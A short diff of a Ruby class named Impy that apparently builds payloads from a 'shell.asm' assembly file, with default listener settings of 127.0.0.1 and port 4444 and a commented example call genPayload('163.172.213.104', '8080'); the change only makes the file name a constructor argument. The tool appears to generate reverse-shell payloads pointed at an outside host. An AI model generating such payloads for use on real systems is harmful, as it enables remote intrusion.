@@ -3,8 +3,8 @@ require 'base64'
 require 'securerandom'
 
 class Impy
-    def initialize()
-        @filename = "shell.asm"
+    def initialize(filename = "shell.asm")
+        @filename = filename
         @asm = File.open(@filename, "r").read()
         @ip = "127.0.0.1"
         @port = "4444"
@@ -123,5 +123,5 @@ class Impy
 
 end
 
-#impy = Impy.new()
-#puts impy.genPayload("163.172.213.104", "8080")
+# impy = Impy.new('shell2.asm')
+# puts impy.genPayload("163.172.213.104", "8080")
